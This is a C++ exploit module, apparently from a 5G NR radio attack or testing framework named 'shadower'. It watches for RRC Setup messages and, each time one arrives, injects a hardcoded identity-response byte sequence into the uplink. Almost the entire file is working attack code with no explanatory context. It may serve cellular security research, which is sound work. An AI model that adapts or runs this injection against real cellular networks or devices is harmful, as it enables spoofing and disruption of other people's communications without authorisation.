#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

const uint8_t identity_response[] = {0x01, 0x03, 0x00, 0x01, 0x00, 0x01, 0x24, 0xc0, 0x01, 0x00, 0x01, 0x3a, 0x0c, 0xbf,
                                     0x00, 0xd0, 0x18, 0x55, 0x2f, 0x81, 0x3f, 0x00, 0x2e, 0x00, 0x06, 0x80, 0x80, 0x78,
                                     0x88, 0x78, 0x7f, 0x80, 0x00, 0x00, 0x00, 0x30, 0x4a, 0x12, 0x80, 0x00, 0x00, 0x00,
                                     0x00, 0x3d, 0x00, 0x39, 0x21, 0x2f, 0x3f, 0x00, 0x00, 0x00, 0x00};

class IdentityResponseExploit : public Exploit
{
public:
  IdentityResponseExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                          SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    identity_response_buf.reset(
        new std::vector<uint8_t>(identity_response, identity_response + sizeof(identity_response)));
  }

  void setup() override { f_rrc_setup = wd_filter("nr-rrc.c1 == 1"); }

  void pre_dissection(wd_t* wd) override { wd_register_filter(wd, f_rrc_setup); }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (wd_read_filter(wd, f_rrc_setup)) {
      logger.info("Received RRC Setup message");
      ul_buffer_queue.push(identity_response_buf);
    }
  }

private:
  wd_filter_t                            f_rrc_setup;
  std::shared_ptr<std::vector<uint8_t> > identity_response_buf;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new IdentityResponseExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}